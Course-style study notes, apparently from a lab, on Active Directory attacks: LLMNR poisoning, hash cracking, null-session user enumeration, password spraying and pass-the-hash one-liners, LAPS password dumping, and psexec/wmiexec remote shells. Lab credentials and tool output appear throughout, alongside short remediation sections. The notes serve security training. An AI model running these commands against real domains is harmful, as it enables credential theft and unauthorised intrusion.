# Active Directory Enumeration & Attacks

- [Initial Enumeration](#initial-enumeration)
    - [External Recon](#external-recon)
    - [Enumeration of the Domain](#enumeration-of-the-domain)
        - [Identifying Hosts](#identifying-hosts)
        - [Identifying Users](#identifying-users)
- [Sniffing out a Foothold](#sniffing-out-a-foothold)
    - [LLMNR/NBT-NS Poisoning - from Linux](#llmnrnbt-ns-poisoning---from-linux)
        - [Responder](#responder)
    - [LLMNR/NBT-NS Poisoning - from Windows](#llmnrnbt-ns-poisoning---from-windows)
        - [Remediation](#Remediation)
- [Password Spraying](#password-spraying)
    - [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
    - [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
    - [Internal Password Spraying - from Linux](#internal-password-spraying---from-linux)
    - [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
    - [Mitigations](#mitigations)
- [Enumerating Security Controls](#enumerating-security-controls)
    - [Windows Defender](#windows-defender)
    - [AppLocker](#applocker)
    - [PowerShell Constrained Language Mode](#powershell-constrained-language-mode)
    - [LAPS](#laps)
- [Credentialed Enumeration - from Linux](#credentialed-enumeration---from-linux)
    - [CrackMapExec](#crackmapexec)
    - [SMBMap](#smbmap)
    - [rpcclient](#rpcclient)
    - [Impacket Toolkit](#impacket-toolkit)
    - [Windapsearch](#windapsearch)
    - [Bloodhound.py](#bloodhoundpy)
- [Credentialed Enumeration - from Windows](#credentialed-enumeration---from-windows)
    - [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
    - [PowerView](#powerview)
    - [SharpView](#sharpview)
    - [Snaffler](#snaffler)
- [Living Off the Land](#living-off-the-land)
- [Kerberoasting](#kerberoasting)
    - [Kerberoasting - from Linux](#kerberoasting---from-linux)
    - [Kerberoasting - from Windows](#kerberoasting---from-windows)
        - [Kerberoasting - Semi Manual method](#kerberoasting---from-windows)
        - [Automated / Tool Based Route](#automated--tool-based-route)
- [ACLs - ACEs Abuse](#acls---aces-abuse)
    - [ACL Enumeration](#acl-enumeration)
        - [Enumerating ACLs with PowerView](#enumerating-acls-with-powerview)
        - [Enumerating ACLs with BloodHound](#enumerating-acls-with-bloodhound)
    - [Abusing ACLs](#abusing-acls)

    
















## Initial Enumeration
### External Recon
- ASN / IP registrars: [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)

- Domain Registrars & DNS: dig and [ICANN](https://lookup.icann.org/en) & [viewdns](https://viewdns.info/)

- Social Media	
- Cloud & Dev Storage Spaces: GitHub, [AWS S3 buckets](https://grayhatwarfare.com/) & Azure Blog storage containers [Azure Blog storage containers](https://grayhatwarfare.com/), Google searches using "Dorks" .

- Breach Data Sources: [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. [TruffleHog](https://github.com/trufflesecurity/truffleHog)


### Enumeration of the Domain

- Key Data Points

|Data Point|	Description|
|:---------|:--------------|
|AD Users|	We are trying to enumerate valid user accounts we can target for password spraying.|
|AD Joined Computers|	Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.|
|Key Services|	Kerberos, NetBIOS, LDAP, DNS|
|Vulnerable Hosts and Services|	Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)|

#### Identifying Hosts
- **Passive Scan**
    ```bash
    # On a host with GUI
    sudo -E wireshark
    ```
    - If we are on host without a GUI, We can use tcpdump or [netcreds](https://github.com/DanMcInerney/net-creds)
    ```bash
    sudo tcpdump -i ens224 
    ```

    - `pktmon.exe` (network monitoring tool built-in) was added to all editions of Windows 10.

    > [!NOTE]
    > As a note for testing, it's always a good idea to save the PCAP traffic you capture. You can review it again later to look for more hints, and it makes for great additional information to include while writing your reports.

    - **Responder**
        - Responder is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses.
    ```bash
    # Starting Responder
    sudo responder -I ens224 -A 
    ```

- **Active Scan**
    - Fping
        - [Fping](https://fping.org/) provides us with a similar capability as the standard ping application
        - Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability
        - Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on.

        ```bash
        # FPing Active Checks
        fping -asgq 172.16.5.0/23
        # a to show targets that are alive
        # s to print stats at the end of the scan 
        # g to generate a target list from the CIDR network 
        # q to not show per-target results.
        ```
    - Nmap
        - For our `hosts.txt` file, some of our results from Responder and fping overlapped
        ```bash
        sudo nmap -v -A -iL hosts.txt -oA /home/htb-student/Documents/host-enum
        ```

#### Identifying Users
- **[Kerbrute](https://github.com/ropnop/kerbrute) - Internal AD Username Enumeration**
    - It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. 
    - We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames).
    ```bash
    # Cloning Kerbrute GitHub Repo
    sudo git clone https://github.com/ropnop/kerbrute.git

    # Compiling for Multiple Platforms and Architectures
    sudo make all

    # Testing the kerbrute_linux_amd64 Binary
    ./kerbrute_linux_amd64 

    # Adding the Tool to our Path
    echo $PATH

    # Moving the binary
    sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

    # Enumerating Users with Kerbrute
    kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

    
    ```

## Sniffing out a Foothold
### LLMNR/NBT-NS Poisoning - from Linux
- Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.
- **LLMNR**
    - If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR.
    - LLMNR is based upon the Domain Name System (DNS) format.
    - It uses port `5355` over UDP natively.
- **NBT-NS**
    - If LLMNR fails, the NBT-NS will be used.
    - NBT-NS identifies systems on a local network by their NetBIOS name. 
    - NBT-NS utilizes port `137` over UDP.

- Tools can be used to attempt LLMNR & NBT-NS poisoning: [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and [Metasploit](https://www.metasploit.com/)


#### Responder 
- The use of the `-w` flag utilizes the built-in WPAD proxy server. 
- This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.

```bash
# Starting Responder with Default Settings
sudo responder -I ens224 
```

- NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash, meaning we have to attempt to crack them offline.

```bash
# Cracking an NTLMv2 Hash With Hashcat
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 

```

### LLMNR/NBT-NS Poisoning - from Windows
- Inveigh works similar to Responder, but is written in PowerShell and C#.
- There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
- [Parameter Help](https://github.com/Kevin-Robertson/Inveigh#parameter-help)
```powershell
# Using Inveigh
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

# LLMNR and NBNS spoofing, and output to the console and write to a file.
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

```
- **C# Inveigh (InveighZero)**
    - The PowerShell version of Inveigh is the original version and is no longer updated. 
    - The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. 
    - Before we can use the C# version of the tool, we have to compile the executable.


- We can hit the `esc` key to enter interactive mode. After typing HELP and hitting enter, we are presented with several options such as:
```powershell
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
```

- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

#### Remediation
- LLMNR
    - We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

- NBT-NS
    - NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP.
    ![disable-nbts](/images/disable_nbtns.jpg)


    - While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
    ```powershell

    $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
    Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

    ```

    - In the Local Group Policy Editor, we will need to double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
    ![nbts-gpo](/images/nbtns_gpo.jpg)

    - To push this out to all hosts in a domain, we could create a GPO using Group Policy Management on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
    ```
    \\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
    ```
    - Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.
    ![nbts-gpo-dc](/images/nbtns_gpo_dc.jpg)

    
## Password Spraying
### Enumerating & Retrieving Password Policies
#### Enumerating the Password Policy - from Linux - Credentialed
- Using Crackmapexec
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

```

#### Enumerating the Password Policy - from Linux - SMB NULL Sessions
```bash
# Using rpcclient
abdeonix@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo

Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX


# Using enum4linux-ng
abdeonix@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight

```

#### Enumerating Null Session - from Windows
```bat
# Establish a null session from windows
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.

```

#### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

```bash
# Using ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

#### Enumerating the Password Policy - from Windows
```bat
# Using net.exe
C:\htb> net accounts

```

```powershell
# Using PowerView

PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

### Password Spraying - Making a Target User List
#### SMB NULL Session to Pull User List

```bash
# Using enum4linux
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

```
- CrackMapExec
    - This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. 
    - It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset.
    ```bash
    # Using CrackMapExec --users Flag
    crackmapexec smb 172.16.5.5 --users
    ```

#### Gathering Users with LDAP Anonymous
```bash
# Using ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

# Using windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U


```


#### Enumerating Users with Kerbrute
- This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. 
- This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for.
- This method of username enumeration does not cause logon failures and will not lock out accounts.

```bash
# Kerbrute user enumeration
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt


```

- Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy.

> [!IMPORTANT]
> If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.


#### Credentialed Enumeration to Build our User List
```bash
# Using CrackMapExec with Valid Credentials
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```


### Internal Password Spraying - from Linux
- **Rpcclient**
    - An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login.
    - We can filter out invalid login attempts by grepping for Authority in the response.

```bash
# Using a Bash one-liner for the Attack
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

```

- **Kerbrute**
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

- **Crackmapexec**
```bash
# Using CrackMapExec & Filtering Logon Failures
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Validating the Credentials with CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123


```

#### Local Administrator Password Reuse
- Trying to login with local administrator hash in the /23 subnet.

```bash
# Local Admin Spraying with CrackMapExec
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

```

### Internal Password Spraying - from Windows
- Also, we can use kerbrute.
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective.
    - If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
    - We can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain.
```powershell
# Using DomainPasswordSpray.ps1
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```

### Mitigations
- Multi-factor Authentication
- Restricting Access: In line with the principle of least privilege, access to the application should be restricted to those who require it.
- Reducing Impact of Successful Exploitation: A quick win is to ensure that privileged users have a separate account for any administrative activities.Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.
- Password Hygiene: Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack.


## Enumerating Security Controls
### Windows Defender

- We can use the built-in PowerShell cmdlet `Get-MpComputerStatus` to get the current Defender status.
- If the `RealTimeProtectionEnabled` parameter is set to True, which means Defender is enabled on the system.



### AppLocker
- An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system.
- AppLocker is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.

- Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.

```powershell
# Using Get-AppLockerPolicy cmdlet
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

```

### PowerShell Constrained Language Mode
- PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
```powershell
# Enumerating Language Mode
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

```

### LAPS 
- The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement.

-  We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. 
    - The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions.

```powershell
# Using Find-LAPSDelegatedGroups
PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins

```

- The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

```powershell
# Using Find-AdmPwdExtendedRights
PS C:\htb> Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
```

- We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```powershell
# Using Get-LAPSComputers
PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
```

## Credentialed Enumeration - from Linux
### CrackMapExec
```bash
# Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395

<SNIP>

# Domain Group Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0

# Logged On Users
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01

<SNIP>

# Share Enumeration - Domain Controller
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 


```

- The module `spider_plus` will dig through each readable share on the host and list all readable files. 

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
```

### SMBMap

```bash
# SMBMap To Check Access
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 

# Recursive List Of All Directories
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only


```

### rpcclient

> [!NOTE]
> The built-in Administrator account will always have the RID value Hex 0x1f4, or 500.

```bash
# SMB NULL Session with rpcclient
rpcclient -U "" -N 172.16.5.5

# RPCClient User Enumeration By RID
rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:

# Enumdomusers
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
user:[fanthony] rid:[0x45a]
user:[wdillard] rid:[0x45b]

```

### Impacket Toolkit
- **Psexec.py**
    - The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. 
    - It then registers the service via RPC and the Windows Service Control Manager. 
    - Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

> [!NOTE]
> To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  


```

- **wmiexec.py**
    - It does not drop any files or executables on the target host and generates fewer logs than other modules.
    - After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). 
    - This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems
    - Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command.

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  

```

### Windapsearch
```bash
# Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:INLANEFREIGHT\forend
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

<SNIP>

# Privileged Users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 nested users for group Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

```

### Bloodhound.py
- The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems or the [BloodHound.py collector](https://github.com/dirkjanm/BloodHound.py) (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files.
- Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher/).

```bash
# Executing BloodHound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>

```

- Once the script finishes, we will see the output files in the current working directory in the format of `<date_object.json>`.

- **Upload the Zip File into the BloodHound GUI**
    - We could then type `sudo neo4j start` to start the neo4j service, firing up the database we'll load the data into and also run Cypher queries against.
    - Start bloodhound GUI, then upload the data.
